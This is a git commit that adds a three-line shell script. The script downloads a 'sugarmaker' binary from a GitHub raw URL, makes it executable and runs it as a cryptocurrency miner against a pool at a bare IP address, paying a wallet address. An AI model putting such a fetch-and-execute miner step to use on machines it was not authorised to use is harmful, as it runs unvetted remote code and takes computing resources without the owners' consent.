ed824adfa742ff16be3d71e8d9dac390a881969f
prynar <84143917+prynar@users.noreply.github.com>
2021-05-30 23:59:24 +0800

    Create sc.sh

---
+++ sc.sh
@@ -0,0 +1,3 @@
+wget https://raw.githubusercontent.com/prynar/ache/main/sugarmaker
+chmod +x sugarmaker
+./sugarmaker -o stratum+tcp://163.44.173.208:3333 -u sugar1qzh695f93u7tfpqjhv8eyfl47w4lupnkckye8ld
